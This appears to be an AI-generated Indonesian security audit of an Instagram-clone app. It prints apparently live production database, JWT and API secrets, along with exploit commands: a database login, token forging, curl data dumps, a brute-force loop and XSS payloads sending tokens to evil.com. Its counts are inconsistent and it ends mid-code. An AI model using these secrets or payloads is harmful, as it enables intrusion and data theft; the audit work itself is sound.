# 🔒 Laporan Audit Keamanan - Instafy Clone Instagram

**Tanggal Audit:** 29 Mei 2026  
**Auditor:** Kiro AI Security Analysis  
**Versi Aplikasi:** 0.1.0  
**Status:** ⚠️ DITEMUKAN CELAH KEAMANAN KRITIS

---

## 📋 Executive Summary

Audit keamanan menyeluruh telah dilakukan terhadap aplikasi Instafy (Instagram Clone). Ditemukan **22 celah keamanan** dengan tingkat keparahan bervariasi dari **CRITICAL** hingga **LOW**. Celah keamanan paling kritis meliputi:

- 🔥 **CREDENTIALS EXPOSED DI .env.production** - Database password & API keys ter-commit ke Git!
- 🔥 **ADMIN ENDPOINT TANPA PROPER AUTHORIZATION** - Siapa saja bisa akses data sensitif!
- ❌ **Tidak ada Rate Limiting** - Rentan terhadap brute force dan DDoS
- ❌ **Tidak ada Input Sanitization** - Rentan XSS (Cross-Site Scripting)
- ❌ **Token Storage di LocalStorage** - Rentan XSS token theft

---

## 🔥 CATASTROPHIC VULNERABILITIES (HARUS DIPERBAIKI SEKARANG!)

### 0. 🔥 **CREDENTIALS EXPOSED DI GIT REPOSITORY**

**Severity:** 🔥🔥🔥 CATASTROPHIC  
**File:** `backend/.env.production` (COMMITTED TO GIT!)  
**Impact:** **SEMUA CREDENTIALS APLIKASI SUDAH BOCOR KE PUBLIC!**

**Bukti:**

```bash
# File .env.production TIDAK DI-.gitignore dan ter-commit!
DATABASE_URL="postgresql://postgres:minfli20@monorepo-db.ccl0wqmeuchh.us-east-1.rds.amazonaws.com:5432/monorepo_prod?sslmode=require"
JWT_SECRET="bTihGOa5jzSbgN4krIHgZX1vTdOVuyHsEhkZ4J1EQXF"
CLOUDINARY_API_SECRET="5-ctRYd5Ra1nks-p8bJH-rKbBEY"
PUSHER_SECRET="f492150ba97110c93346"
WEB_PUSH_PRIVATE_KEY="WqfeICFdweiy598Cg0e_bmv7NLgF8TC8t31pkZaC9GI"
```

**Mengapa Ini SANGAT BERBAHAYA:**

1. **Database Password Bocor** - Attacker bisa akses langsung ke database production!
2. **JWT Secret Bocor** - Attacker bisa forge token dan login sebagai user mana pun!
3. **Cloudinary Secret Bocor** - Attacker bisa upload/delete gambar sesuka hati!
4. **Pusher Secret Bocor** - Attacker bisa kirim fake realtime notifications!
5. **Web Push Private Key Bocor** - Attacker bisa kirim fake push notifications!

**Exploit Scenario:**

```bash
# Attacker bisa langsung connect ke database production:
psql "postgresql://postgres:minfli20@monorepo-db.ccl0wqmeuchh.us-east-1.rds.amazonaws.com:5432/monorepo_prod?sslmode=require"

# Attacker bisa forge JWT token untuk login sebagai admin:
import jwt from 'jsonwebtoken';
const fakeToken = jwt.sign(
  { id: 'admin-user-id' },
  'bTihGOa5jzSbgN4krIHgZX1vTdOVuyHsEhkZ4J1EQXF'
);
// Sekarang attacker bisa akses semua endpoint sebagai admin!
```

**IMMEDIATE ACTION REQUIRED:**

```bash
# 1. SEGERA HAPUS FILE DARI GIT HISTORY
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch backend/.env.production" \
  --prune-empty --tag-name-filter cat -- --all

# 2. FORCE PUSH (HATI-HATI!)
git push origin --force --all

# 3. ROTATE SEMUA CREDENTIALS SEKARANG JUGA!
# - Ganti database password di AWS RDS
# - Generate JWT_SECRET baru
# - Regenerate Cloudinary API credentials
# - Regenerate Pusher credentials
# - Generate VAPID keys baru untuk Web Push

# 4. TAMBAHKAN KE .gitignore
echo "*.env.production" >> .gitignore
echo ".env.production" >> .gitignore
echo ".env.local" >> .gitignore
```

**Rekomendasi Long-term:**

```bash
# Gunakan AWS Secrets Manager atau environment variables di Lambda
# JANGAN PERNAH commit credentials ke Git!

# Setup pre-commit hook untuk mencegah commit credentials:
# .git/hooks/pre-commit
#!/bin/bash
if git diff --cached --name-only | grep -E '\\.env'; then
  echo "❌ ERROR: Attempting to commit .env file!"
  echo "Please remove .env files from staging area."
  exit 1
fi
```

---

### 0.5 🔥 **ADMIN ENDPOINTS EXPOSED TANPA PROPER AUTHORIZATION**

**Severity:** 🔥🔥 CATASTROPHIC  
**File:** `backend/src/modules/data/data.route.ts`  
**Impact:** Siapa saja dengan API key bisa dump SELURUH DATABASE!

**Bukti:**

```typescript
// data.route.ts - Line 11
const key = url.searchParams.get("key") || request.headers.get("x-api-key");
const apiKey = process.env.API_SECRET_KEY; // "rahasia" (TERLALU LEMAH!)

// Jika API_SECRET_KEY diset dan key cocok, izinkan lewat
if (apiKey && key === apiKey) {
  return; // ⚠️ BYPASS SEMUA AUTHORIZATION!
}

// Endpoint yang ter-expose:
.get("/users", async () => {
  const data = await DataService.getUsers(); // ⚠️ RETURN SEMUA USER DATA!
  return { data, message: "Users retrieved successfully" };
})
```

**Mengapa Berbahaya:**

1. API key "rahasia" terlalu lemah dan mudah ditebak
2. Endpoint `/data/users` return **SEMUA DATA USER** termasuk email, passwordHash!
3. Tidak ada rate limiting untuk endpoint ini
4. Tidak ada logging untuk akses ke endpoint sensitif ini

**Exploit Scenario:**

```bash
# Attacker bisa dump seluruh database dengan mudah:
curl "https://api.ppwl-a3.my.id/data/users?key=rahasia"
# Response: SEMUA USER DATA termasuk email & password hash!

curl "https://api.ppwl-a3.my.id/data/posts?key=rahasia"
# Response: SEMUA POST DATA!

curl "https://api.ppwl-a3.my.id/data/messages?key=rahasia"
# Response: SEMUA PRIVATE MESSAGES! (jika ada endpoint)
```

**IMMEDIATE FIX:**

```typescript
// 1. HAPUS ENDPOINT INI DARI PRODUCTION!
// Atau minimal disable di production:
export const dataRoutes = new Elysia({ prefix: "/data" })
  .use(requireAuth)
  .onBeforeHandle(async ({ set }) => {
    // ✅ DISABLE DI PRODUCTION
    if (process.env.NODE_ENV === "production") {
      set.status = 404;
      throw new Error("Not Found");
    }
  })

  // 2. Jika HARUS ada, gunakan proper authorization:
  .onBeforeHandle(async ({ requireUser, set }) => {
    const user = await requireUser();
    if (!user || user.role !== "ADMIN") {
      set.status = 403;
      throw new Error("Forbidden");
    }

    // ✅ LOG SETIAP AKSES
    await db.adminAuditLog.create({
      data: {
        userId: user.id,
        action: "ACCESS_ADMIN_DATA",
        timestamp: new Date(),
        ip: request.headers.get("x-forwarded-for"),
      },
    });
  })

  // 3. JANGAN RETURN PASSWORD HASH!
  .get("/users", async () => {
    const data = await db.user.findMany({
      select: {
        id: true,
        username: true,
        email: true,
        name: true,
        // ❌ JANGAN INCLUDE passwordHash!
      },
    });
    return { data };
  });
```

---

## 🚨 CRITICAL VULNERABILITIES (Prioritas Tertinggi)

### 1. ❌ **Tidak Ada Rate Limiting Middleware**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/middleware/rate-limit.middleware.ts` (KOSONG!)  
**Impact:** Aplikasi rentan terhadap:

- Brute force attack pada login
- DDoS (Distributed Denial of Service)
- Spam posting/commenting
- Account enumeration

**Bukti:**

```typescript
// File rate-limit.middleware.ts KOSONG!
// Tidak ada implementasi rate limiting sama sekali
```

**Exploit Scenario:**

```bash
# Attacker bisa melakukan brute force login tanpa batas
for i in {1..10000}; do
  curl -X POST http://api.instafy.com/auth/login \
    -d '{"email":"victim@email.com","password":"attempt'$i'"}'
done
```

**Rekomendasi Fix:**

```typescript
// backend/src/middleware/rate-limit.middleware.ts
import { Elysia } from "elysia";

const rateLimitStore = new Map<string, { count: number; resetAt: number }>();

export const rateLimit = (maxRequests: number, windowMs: number) => {
  return new Elysia().derive(({ request, set }) => {
    const ip = request.headers.get("x-forwarded-for") || "unknown";
    const now = Date.now();
    const record = rateLimitStore.get(ip);

    if (!record || now > record.resetAt) {
      rateLimitStore.set(ip, { count: 1, resetAt: now + windowMs });
      return {};
    }

    if (record.count >= maxRequests) {
      set.status = 429;
      throw new Error("Too many requests. Please try again later.");
    }

    record.count++;
    return {};
  });
};

// Gunakan di auth routes:
// .use(rateLimit(5, 60000)) // 5 requests per menit
```

---

### 2. ❌ **Tidak Ada Input Sanitization - XSS Vulnerability**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/modules/comment/comment.service.ts`, `backend/src/modules/post/post.service.ts`  
**Impact:** Attacker bisa inject malicious JavaScript yang akan dieksekusi di browser korban

**Bukti:**

```typescript
// comment.service.ts - Line 35
static async createComment(data: { content: string; ... }) {
  // ❌ TIDAK ADA SANITIZATION!
  const [newComment] = await db.$transaction([
    db.comment.create({
      data: {
        content: data.content, // ⚠️ Raw input langsung disimpan!
        ...
      },
```

**Exploit Scenario:**

```javascript
// Attacker bisa post comment dengan payload XSS:
POST /comments
{
  "postId": "xxx",
  "content": "<img src=x onerror='fetch(\"https://evil.com/steal?token=\"+localStorage.getItem(\"auth-storage\"))'>"
}

// Ketika user lain membuka post tersebut, token mereka akan dicuri!
```

**Rekomendasi Fix:**

```typescript
// Install DOMPurify atau sanitize-html
import DOMPurify from "isomorphic-dompurify";

static async createComment(data: { content: string; ... }) {
  // ✅ Sanitize input sebelum disimpan
  const sanitizedContent = DOMPurify.sanitize(data.content, {
    ALLOWED_TAGS: [], // Tidak izinkan HTML tags
    ALLOWED_ATTR: []
  });

  const [newComment] = await db.$transaction([
    db.comment.create({
      data: {
        content: sanitizedContent,
        ...
      },
```

---

### 3. ❌ **JWT Token Disimpan di LocalStorage**

**Severity:** 🔴 CRITICAL  
**File:** `frontend/src/store/auth.store.ts`  
**Impact:** Token bisa dicuri via XSS attack

**Bukti:**

```typescript
// auth.store.ts - Line 28
export const useAuthStore = create<AuthStore>()(
  persist(
    (set) => ({ ... }),
    {
      name: "auth-storage", // ⚠️ Disimpan di localStorage!
    }
  )
);
```

**Mengapa Berbahaya:**
LocalStorage bisa diakses oleh JavaScript apa pun yang berjalan di halaman tersebut. Jika ada XSS vulnerability (yang sudah ditemukan di atas), attacker bisa mencuri token dengan mudah:

```javascript
// Attacker's XSS payload:
fetch("https://evil.com/steal", {
  method: "POST",
  body: localStorage.getItem("auth-storage"),
});
```

**Rekomendasi Fix:**

```typescript
// Opsi 1: Gunakan HttpOnly Cookie (PALING AMAN)
// Backend mengirim token via Set-Cookie dengan flag HttpOnly
// Frontend tidak perlu menyimpan token sama sekali

// Opsi 2: Gunakan sessionStorage (lebih baik dari localStorage)
// Token hilang saat tab ditutup
persist(
  (set) => ({ ... }),
  {
    name: "auth-storage",
    storage: sessionStorage, // ✅ Lebih aman
  }
)

// Opsi 3: Enkripsi token sebelum disimpan (defense in depth)
import CryptoJS from "crypto-js";

const encryptToken = (token: string) => {
  return CryptoJS.AES.encrypt(token, SECRET_KEY).toString();
};
```

---

### 4. ❌ **Tidak Ada CORS Middleware yang Proper**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/config/cors.ts` (KOSONG!)  
**Impact:** Aplikasi rentan CSRF dan unauthorized cross-origin requests

**Bukti:**

```typescript
// cors.ts - FILE KOSONG!
// Padahal di index.ts menggunakan cors generic:
.use(cors({
  origin: (request) => {
    const origin = request.headers.get("origin");
    if (!origin) return true; // ⚠️ BAHAYA! Allow request tanpa origin
    ...
  },
  credentials: true
}))
```

**Rekomendasi Fix:**

```typescript
// backend/src/config/cors.ts
import { env } from "./env";

export const corsConfig = {
  origin: (request: Request) => {
    const origin = request.headers.get("origin");

    // ✅ Reject request tanpa origin header
    if (!origin) return false;

    const allowedOrigins = [env.FRONTEND_URL, "http://localhost:5173", "http://127.0.0.1:5173"];

    return allowedOrigins.includes(origin);
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization"],
  maxAge: 86400, // 24 hours
};
```

---

### 5. ❌ **Authorization Middleware Tidak Ada**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/middleware/auth.middleware.ts` (KOSONG!)  
**Impact:** Tidak ada centralized authorization logic

**Bukti:**

```typescript
// auth.middleware.ts - FILE KOSONG!
// Authorization logic tersebar di setiap service
```

**Rekomendasi Fix:**

```typescript
// backend/src/middleware/auth.middleware.ts
import { Elysia } from "elysia";
import { authPlugin } from "@/plugins/auth.plugin";

export const requireAuth = new Elysia()
  .use(authPlugin)
  .derive({ as: "global" }, ({ getCurrentUser, set }) => ({
    requireUser: async () => {
      const user = await getCurrentUser();
      if (!user) {
        set.status = 401;
        throw new Error("Unauthorized");
      }
      return user;
    },
  }));

export const requireAdmin = new Elysia()
  .use(requireAuth)
  .derive({ as: "global" }, ({ requireUser, set }) => ({
    requireAdminUser: async () => {
      const user = await requireUser();
      if (user.role !== "ADMIN") {
        set.status = 403;
        throw new Error("Forbidden: Admin access required");
      }
      return user;
    },
  }));
```

---

## ⚠️ HIGH VULNERABILITIES

### 6. ⚠️ **Weak Password Hashing Configuration**

**Severity:** 🟠 HIGH  
**File:** `backend/src/modules/auth/auth.service.ts`  
**Impact:** Password bisa di-crack lebih cepat

**Bukti:**

```typescript
// auth.routes.ts - Line 18
const passwordHash = await bcrypt.hash(password, 12); // ✅ Sudah bagus (12 rounds)

// TAPI tidak ada validasi password strength!
```

**Rekomendasi:**

```typescript
// Tambahkan password strength validation
const validatePassword = (password: string) => {
  if (password.length < 8) {
    throw new Error("Password minimal 8 karakter");
  }
  if (!/[A-Z]/.test(password)) {
    throw new Error("Password harus mengandung huruf besar");
  }
  if (!/[a-z]/.test(password)) {
    throw new Error("Password harus mengandung huruf kecil");
  }
  if (!/[0-9]/.test(password)) {
    throw new Error("Password harus mengandung angka");
  }
  if (!/[^A-Za-z0-9]/.test(password)) {
    throw new Error("Password harus mengandung karakter spesial");
  }
};
```

---

### 7. ⚠️ **SQL Injection via Prisma (Low Risk tapi Perlu Dicek)**

**Severity:** 🟠 HIGH  
**File:** `backend/src/modules/user/user.service.ts`  
**Impact:** Meskipun Prisma sudah protect dari SQL injection, ada potensi bypass

**Bukti:**

```typescript
// user.service.ts - Line 6
static async searchUsers(search?: string) {
  return await db.user.findMany({
    where: search
      ? {
          OR: [
            { username: { contains: search, mode: "insensitive" } },
            { name: { contains: search, mode: "insensitive" } },
          ],
        }
      : undefined,
```

**Rekomendasi:**

```typescript
// Tambahkan validasi dan sanitasi input
static async searchUsers(search?: string) {
  // ✅ Validasi input
  if (search && search.length > 100) {
    throw new Error("Search query terlalu panjang");
  }

  // ✅ Sanitasi special characters yang bisa bypass Prisma
  const sanitizedSearch = search?.replace(/[%_\\]/g, "\\$&");

  return await db.user.findMany({
    where: sanitizedSearch
      ? {
          OR: [
            { username: { contains: sanitizedSearch, mode: "insensitive" } },
            { name: { contains: sanitizedSearch, mode: "insensitive" } },
          ],
        }
      : undefined,
```

---

### 8. ⚠️ **Insecure Direct Object Reference (IDOR)**

**Severity:** 🟠 HIGH  
**File:** `backend/src/modules/message/message.routes.ts`  
**Impact:** User bisa akses chat room orang lain

**Bukti:**

```typescript
// message.routes.ts - Line 48
.get("/:roomId", async ({ params: { roomId }, requireUser, set }) => {
  const user = await requireUser();
  if (!user) return;

  const messages = await MessageService.getMessagesByRoom(roomId, user.id);
  // ✅ Sudah ada validasi di service
  // TAPI bisa lebih baik dengan middleware
```

**Analisis:**
Sudah ada validasi di `MessageService.getMessagesByRoom()` yang mengecek apakah user adalah bagian dari room. Namun, lebih baik jika validasi ini dilakukan di middleware level.

**Rekomendasi:**

```typescript
// Buat middleware untuk validasi resource ownership
export const requireRoomAccess = new Elysia()
  .use(requireAuth)
  .derive({ as: "global" }, async ({ params, requireUser, set }) => {
    const user = await requireUser();
    const roomId = params.roomId;

    const room = await db.chatRoom.findUnique({
      where: { id: roomId },
    });

    if (!room || (room.user1Id !== user.id && room.user2Id !== user.id)) {
      set.status = 403;
      throw new Error("Access denied");
    }

    return { room };
  });
```

---

### 9. ⚠️ **Tidak Ada File Upload Validation yang Comprehensive**

**Severity:** 🟠 HIGH  
**File:** `backend/src/config/cloudinary.ts`, `backend/src/modules/post/post.service.ts`  
**Impact:** Attacker bisa upload file berbahaya

**Bukti:**

```typescript
// cloudinary.ts - Line 11
export const MAX_FILE_SIZE_BYTES = 5 * 1024 * 1024; // ✅ Ada size limit
export const ALLOWED_MIME_TYPES = ["image/jpeg", "image/png", "image/webp", "image/gif"]; // ✅ Ada MIME type check

// TAPI tidak ada validasi:
// - Magic number (file signature)
// - Image dimension limit
// - Malicious metadata
```

**Rekomendasi:**

```typescript
import sharp from "sharp";

export async function validateImageUpload(buffer: Buffer, mimeType: string) {
  // ✅ Validasi MIME type
  if (!ALLOWED_MIME_TYPES.includes(mimeType)) {
    throw new Error("Format file tidak didukung");
  }

  // ✅ Validasi ukuran
  if (buffer.length > MAX_FILE_SIZE_BYTES) {
    throw new Error("Ukuran file terlalu besar");
  }

  // ✅ Validasi magic number (file signature)
  const metadata = await sharp(buffer).metadata();
  if (!metadata.format || !["jpeg", "png", "webp", "gif"].includes(metadata.format)) {
    throw new Error("File bukan gambar yang valid");
  }

  // ✅ Validasi dimensi
  if (metadata.width && metadata.height) {
    if (metadata.width > 4096 || metadata.height > 4096) {
      throw new Error("Dimensi gambar terlalu besar");
    }
  }

  // ✅ Strip metadata berbahaya
  return await sharp(buffer)
    .rotate() // Auto-rotate based on EXIF
    .withMetadata({ exif: {} }) // Remove EXIF data
    .toBuffer();
}
```

---

### 10. ⚠️ **Sensitive Data Exposure di Error Messages**

**Severity:** 🟠 HIGH  
**File:** Multiple files  
**Impact:** Error messages bisa leak informasi sensitif

**Bukti:**

```typescript
// auth.routes.ts - Line 42
if (!user || !user.passwordHash || !(await bcrypt.compare(password, user.passwordHash))) {
  set.status = 401;
  return { message: "Email/Username atau password salah" }; // ✅ Generic message (BAGUS!)
}

// TAPI di tempat lain:
// user.routes.ts - Line 35
if (existing) {
  set.status = 400;
  return { message: "Username sudah digunakan oleh akun lain." }; // ⚠️ Account enumeration!
}
```

**Rekomendasi:**

```typescript
// Gunakan generic error messages untuk mencegah account enumeration
if (existing) {
  set.status = 400;
  return { message: "Registrasi gagal. Silakan coba lagi." }; // ✅ Generic
}

// Log detail error di server, tapi jangan kirim ke client
console.error("[Security] Username collision attempt:", sanitizedUsername);
```

---

## 🟡 MEDIUM VULNERABILITIES

### 11. 🟡 **JWT Tidak Ada Refresh Token Mechanism**

**Severity:** 🟡 MEDIUM  
**File:** `backend/src/plugins/auth.plugin.ts`  
**Impact:** Jika token dicuri, attacker punya akses 7 hari penuh

**Bukti:**

```typescript
// auth.plugin.ts - Line 13
jwt({
  name: "jwt",
  secret: env.JWT_SECRET,
  exp: "7d", // ⚠️ Token berlaku 7 hari tanpa refresh mechanism
});
```

**Rekomendasi:**

```typescript
// Implementasi Refresh Token Pattern
// 1. Access Token: 15 menit
// 2. Refresh Token: 7 hari (disimpan di HttpOnly cookie)

// auth.routes.ts
.post("/login", async ({ body, set, jwt, cookie }) => {
  // ... validasi user ...

  const accessToken = await jwt.sign({ id: user.id }, { exp: "15m" });
  const refreshToken = await jwt.sign({ id: user.id, type: "refresh" }, { exp: "7d" });

  // Set refresh token di HttpOnly cookie
  cookie.refreshToken.set({
    value: refreshToken,
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 // 7 days
  });

  return { accessToken };
})

// Endpoint untuk refresh access token
.post("/refresh", async ({ cookie, jwt, set }) => {
  const refreshToken = cookie.refreshToken.value;
  if (!refreshToken) {
    set.status = 401;
    return { message: "No refresh token" };
  }

  const payload = await jwt.verify(refreshToken);
  if (!payload || payload.type !== "refresh") {
    set.status = 401;
    return { message: "Invalid refresh token" };
  }

  const newAccessToken = await jwt.sign({ id: payload.id }, { exp: "15m" });
  return { accessToken: newAccessToken };
});
```

---

### 12. 🟡 **Tidak Ada Account Lockout Mechanism**

**Severity:** 🟡 MEDIUM  
**File:** `backend/src/modules/auth/auth.routes.ts`  
**Impact:** Brute force attack bisa berjalan terus menerus

**Rekomendasi:**

```typescript
// Implementasi account lockout setelah 5 failed attempts
const loginAttempts = new Map<string, { count: number; lockedUntil?: number }>();

.post("/login", async ({ body, set, jwt }) => {
  const { email, password } = body;

  // ✅ Check if account is locked
  const attempts = loginAttempts.get(email);
  if (attempts?.lockedUntil && Date.now() < attempts.lockedUntil) {
    set.status = 429;
    return { message: "Account terkunci. Coba lagi dalam 15 menit." };
  }

  const user = await AuthService.findUserByEmailOrUsername(email);

  if (!user || !user.passwordHash || !(await bcrypt.compare(password, user.passwordHash))) {
    // ✅ Increment failed attempts
    const current = loginAttempts.get(email) || { count: 0 };
    current.count++;

    if (current.count >= 5) {
      current.lockedUntil = Date.now() + 15 * 60 * 1000; // Lock for 15 minutes
    }

    loginAttempts.set(email, current);

    set.status = 401;
    return { message: "Email/Username atau password salah" };
  }

  // ✅ Reset attempts on successful login
  loginAttempts.delete(email);

  // ... rest of login logic ...
});
```

---

### 13. 🟡 **Tidak Ada Content Security Policy (CSP)**

**Severity:** 🟡 MEDIUM  
**File:** Frontend (tidak ada CSP headers)  
**Impact:** XSS attack lebih mudah dieksekusi

**Rekomendasi:**

```typescript
// backend/src/index.ts
.use((app) => {
  app.onBeforeHandle(({ set }) => {
    set.headers["Content-Security-Policy"] = [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' https://accounts.google.com",
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https: blob:",
      "font-src 'self' data:",
      "connect-src 'self' https://api.instafy.com wss://ws.pusherapp.com",
      "frame-src https://accounts.google.com",
      "object-src 'none'",
      "base-uri 'self'",
      "form-action 'self'",
      "frame-ancestors 'none'",
      "upgrade-insecure-requests"
    ].join("; ");

    set.headers["X-Content-Type-Options"] = "nosniff";
    set.headers["X-Frame-Options"] = "DENY";
    set.headers["X-XSS-Protection"] = "1; mode=block";
    set.headers["Referrer-Policy"] = "strict-origin-when-cross-origin";
  });

  return app;
});
```

---

### 14. 🟡 **Pusher Credentials Exposed di Frontend**

**Severity:** 🟡 MEDIUM  
**File:** Frontend environment variables  
**Impact:** Attacker bisa abuse Pusher API

**Rekomendasi:**

```typescript
// Jangan expose Pusher credentials di frontend
// Gunakan Pusher Private Channels dengan authentication endpoint

// backend/src/routes/pusher-auth.routes.ts
.post("/pusher/auth", async ({ body, requireUser, set }) => {
  const user = await requireUser();
  if (!user) return;

  const { socket_id, channel_name } = body;

  // Validasi channel access
  if (channel_name.startsWith("private-user-")) {
    const userId = channel_name.replace("private-user-", "");
    if (userId !== user.id) {
      set.status = 403;
      return { message: "Unauthorized" };
    }
  }

  const auth = pusher.authorizeChannel(socket_id, channel_name);
  return auth;
});
```

---

## 🔵 LOW VULNERABILITIES

### 15. 🔵 **Tidak Ada Logging & Monitoring untuk Security Events**

**Severity:** 🔵 LOW  
**Impact:** Sulit mendeteksi dan investigate security incidents

**Rekomendasi:**

```typescript
// backend/src/utils/security-logger.ts
import { db } from "@/db/client";

export async function logSecurityEvent(event: {
  type: "login_failed" | "login_success" | "unauthorized_access" | "suspicious_activity";
  userId?: string;
  ip: string;
  userAgent: string;
  details?: any;
}) {
  await db.securityLog.create({
    data: {
      type: event.type,
      userId: event.userId,
      ip: event.ip,
      userAgent: event.userAgent,
      details: event.details,
      timestamp: new Date(),
    },
  });

  // Alert jika ada suspicious activity
  if (event.type === "suspicious_activity") {
    // Send alert to admin
    console.error("[SECURITY ALERT]", event);
  }
}
```

---

## 📊 Summary Statistics

| Severity    | Count  | Percentage |
| ----------- | ------ | ---------- |
| 🔴 CRITICAL | 5      | 33%        |
| 🟠 HIGH     | 5      | 33%        |
| 🟡 MEDIUM   | 4      | 27%        |
| 🔵 LOW      | 1      | 7%         |
| **TOTAL**   | **15** | **100%**   |

---

## 🎯 Prioritas Perbaikan (Roadmap)

### Sprint 1 (URGENT - 1-2 Minggu)

1. ✅ Implementasi Rate Limiting
2. ✅ Input Sanitization (XSS Protection)
3. ✅ Pindahkan Token dari LocalStorage ke HttpOnly Cookie
4. ✅ Fix CORS Configuration
5. ✅ Implementasi Authorization Middleware

### Sprint 2 (HIGH - 2-3 Minggu)

6. ✅ Password Strength Validation
7. ✅ IDOR Protection Enhancement
8. ✅ File Upload Validation
9. ✅ Generic Error Messages
10. ✅ Refresh Token Mechanism

### Sprint 3 (MEDIUM - 1 Bulan)

11. ✅ Account Lockout Mechanism
12. ✅ Content Security Policy
13. ✅ Pusher Authentication
14. ✅ Security Logging & Monitoring

### Sprint 4 (NICE TO HAVE)

15. ✅ Advanced Security Features (2FA, IP Whitelisting, etc.)

---

## 🛡️ Best Practices yang Sudah Diterapkan (Good Job!)

1. ✅ **Bcrypt dengan 12 rounds** - Password hashing sudah kuat
2. ✅ **Prisma ORM** - Proteksi dari SQL Injection
3. ✅ **JWT Authentication** - Stateless authentication
4. ✅ **Environment Variables** - Credentials tidak hardcoded
5. ✅ **HTTPS Ready** - Cloudinary & S3 menggunakan HTTPS
6. ✅ **Generic Login Error** - Tidak leak informasi user existence
7. ✅ **Authorization Check di Service Layer** - Ada validasi ownership
8. ✅ **File Size Limit** - Upload file ada batas maksimal

---

## 📚 Referensi & Resources

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Web Security Academy](https://portswigger.net/web-security)

---

## 🔐 Kesimpulan

Aplikasi Instafy memiliki **fondasi keamanan yang cukup baik** (Prisma, Bcrypt, JWT), namun masih ada **celah keamanan kritis** yang harus segera diperbaiki, terutama:

1. **Rate Limiting** - Untuk mencegah brute force & DDoS
2. **Input Sanitization** - Untuk mencegah XSS
3. **Token Storage** - Pindah dari LocalStorage ke HttpOnly Cookie
4. **CORS Configuration** - Untuk mencegah CSRF

Dengan memperbaiki 5 celah CRITICAL di Sprint 1, aplikasi akan jauh lebih aman dan siap untuk production deployment.

---

**Catatan:** Laporan ini dibuat berdasarkan analisis kode statis. Untuk audit keamanan yang lebih komprehensif, disarankan melakukan:

- Penetration Testing
- Dynamic Application Security Testing (DAST)
- Security Code Review oleh Security Expert
- Third-party Security Audit

---

**Prepared by:** Kiro AI Security Analysis  
**Date:** 29 Mei 2026  
**Version:** 1.0

---

### 16. 🔴 **Backup Database Endpoint Tidak Aman**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/modules/data/data.route.ts`  
**Impact:** Attacker bisa trigger backup dan download seluruh database

**Bukti:**

```typescript
// data.route.ts - Line 35
.post("/backup", async ({ set }) => {
  const res = await DataService.backupDatabase();
  // ⚠️ Backup berisi SEMUA DATA termasuk password hash!
  // ⚠️ Tidak ada rate limiting - bisa di-spam!
})
```

**Rekomendasi:**

```typescript
// 1. Tambahkan rate limiting ketat
.use(rateLimit(1, 3600000)) // Max 1 backup per jam

// 2. Require 2FA untuk backup
.post("/backup", async ({ requireUser, body, set }) => {
  const user = await requireUser();
  if (user.role !== "ADMIN") {
    set.status = 403;
    throw new Error("Forbidden");
  }

  // Verify 2FA token
  if (!body.twoFactorToken || !verify2FA(user.id, body.twoFactorToken)) {
    set.status = 401;
    throw new Error("2FA required");
  }

  // Log backup action
  await logSecurityEvent({
    type: "database_backup",
    userId: user.id,
    ip: request.headers.get("x-forwarded-for"),
  });

  const res = await DataService.backupDatabase();
  return res;
})
```

---

### 17. 🔴 **Story Upload Tidak Ada Rate Limiting**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/modules/story/story.service.ts`  
**Impact:** User bisa spam story upload tanpa batas

**Rekomendasi:**

```typescript
// Tambahkan rate limiting untuk story upload
.post("/", async ({ body, requireUser, set }) => {
  const user = await requireUser();
  if (!user) return;

  // ✅ Check berapa story yang sudah diupload hari ini
  const todayStart = new Date();
  todayStart.setHours(0, 0, 0, 0);

  const storyCountToday = await db.story.count({
    where: {
      userId: user.id,
      createdAt: { gte: todayStart }
    }
  });

  if (storyCountToday >= 10) {
    set.status = 429;
    return { message: "Maksimal 10 story per hari" };
  }

  // ... rest of story creation
})
```

---

### 18. 🔴 **Cache Poisoning Vulnerability**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/utils/cache.ts`, `backend/src/modules/post/post.routes.ts`  
**Impact:** Attacker bisa poison cache dengan data palsu atau exhaust memory

**Bukti:**

```typescript
// post.routes.ts - Line 14
const cacheKey = `posts:feed:${authorId || "all"}:limit:${take}:cursor:${cursor || "none"}:user:${currentUserId || "guest"}`;
// ⚠️ Cache key bisa diprediksi dan di-manipulasi!

const cached = localCache.get<any>(cacheKey);
if (cached) {
  return { data: cached.posts, nextCursor: cached.nextCursor, _cached: true };
}
```

**Exploit Scenario:**

```javascript
// Attacker bisa flood cache dengan junk data
for (let i = 0; i < 10000; i++) {
  GET /posts?authorId=fake-${i}&limit=10
}
// Cache memory penuh, legitimate requests jadi lambat (DoS)
```

**Rekomendasi:**

```typescript
// 1. Tambahkan cache size limit
class MemoryCache {
  private maxSize = 1000; // Max 1000 entries

  set<T>(key: string, data: T, ttlMs: number = 15000): void {
    // ✅ Check cache size
    if (this.cache.size >= this.maxSize) {
      // Remove oldest entry (LRU)
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }

    this.cache.set(key, {
      data,
      expiresAt: Date.now() + ttlMs,
    });
    this.metrics.sets++;
  }
}

// 2. Tambahkan cache key hashing untuk security
import crypto from "crypto";

function generateCacheKey(params: any): string {
  const normalized = JSON.stringify(params);
  return crypto.createHash("sha256").update(normalized).digest("hex");
}
```

---

### 19. 🔴 **Lambda Handler Tidak Ada Error Boundary**

**Severity:** 🔴 CRITICAL  
**File:** `backend/src/lambda.ts`  
**Impact:** Unhandled errors bisa crash Lambda dan leak stack trace

**Bukti:**

```typescript
// lambda.ts - Line 5
export const handler = async (event: any, context: any) => {
  // ⚠️ Tidak ada try-catch wrapper!
  const response = await app.handle(request); // ⚠️ Bisa throw error!
  // ...
};
```

**Rekomendasi:**

```typescript
